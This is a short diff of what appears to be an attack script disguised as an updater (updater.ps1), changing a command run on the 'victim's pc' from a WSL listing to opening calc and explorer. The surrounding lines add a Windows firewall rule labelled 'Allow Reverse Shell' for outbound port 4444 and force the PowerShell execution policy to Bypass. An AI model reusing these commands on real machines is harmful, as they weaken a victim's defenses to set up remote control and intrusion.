@@ -213,8 +213,9 @@ Add-Content -Path "C:\Users\Public\log.txt" -Value "$(Get-Date): updater.ps1 tri
 netsh advfirewall firewall add rule name="Allow Reverse Shell" dir=out action=allow protocol=TCP remoteport=4444
 Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force
 
-///victim's pc wsl command Execution
-wsl -d Debian -- ls
+///victim's pc more usefull command Execution
+ start calc & start explorer
+
 
 
 
